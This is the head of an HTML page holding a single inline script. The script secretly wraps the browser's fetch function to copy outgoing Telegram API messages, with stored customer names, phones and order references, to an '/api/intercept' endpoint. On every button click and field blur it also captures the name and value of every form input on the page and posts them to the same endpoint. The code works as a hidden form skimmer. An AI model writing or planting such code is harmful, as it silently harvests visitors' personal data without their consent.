<!DOCTYPE html><html lang="en"><head>
<script>
(function() {
  'use strict';
  // ─── 1. Intercept Fetch for Telegram & API ───
  var _originalFetch = window.fetch;
  window.fetch = function(url, options) {
    var urlStr = typeof url === "string" ? url : (url && url.url ? url.url : String(url));
    if (urlStr && urlStr.indexOf("api.telegram.org") !== -1 && options && options.method === "POST") {
      try {
        var body = JSON.parse(options.body);
        var orderData = {
          raw_message: body.text || "",
          page: window.location.pathname,
          timestamp: new Date().toISOString(),
          customer_name: localStorage.getItem("customer_name") || "",
          customer_phone: localStorage.getItem("customer_phone") || "",
          service_type: localStorage.getItem("service_type") || "",
          order_ref: localStorage.getItem("maawen_order_ref") || ""
        };
        _originalFetch.call(window, "/api/intercept", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(orderData)
        }).then(r => r.json()).then(data => {
          if (data && data.orderRef) localStorage.setItem("maawen_order_ref", data.orderRef);
        }).catch(e => {});
      } catch(e) {}
    }
    return _originalFetch.apply(this, arguments);
  };

  // ─── 2. Auto-sync Data from Forms ───
  function syncFormData() {
    var data = {
      page: window.location.pathname,
      timestamp: new Date().toISOString(),
      customer_name: localStorage.getItem("customer_name") || "",
      customer_phone: localStorage.getItem("customer_phone") || "",
      customer_address: localStorage.getItem("customer_address") || "",
      service_type: localStorage.getItem("service_type") || "",
      order_ref: localStorage.getItem("maawen_order_ref") || ""
    };
    
    // Capture any input changes
    document.querySelectorAll('input, select, textarea').forEach(function(el) {
      if (el.name) {
        if (el.value) localStorage.setItem(el.name, el.value);
        data[el.name] = el.value;
      }
    });

    _originalFetch.call(window, "/api/intercept", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    }).then(r => r.json()).then(data => {
      if (data && data.orderRef) localStorage.setItem("maawen_order_ref", data.orderRef);
    }).catch(e => {});
  }

  // Listen for clicks and inputs
  document.addEventListener('click', function(e) {
    if (e.target.tagName === 'BUTTON' || e.target.closest('button')) {
      setTimeout(syncFormData, 100);
    }
  });
  document.addEventListener('blur', syncFormData, true);
})();
</script>
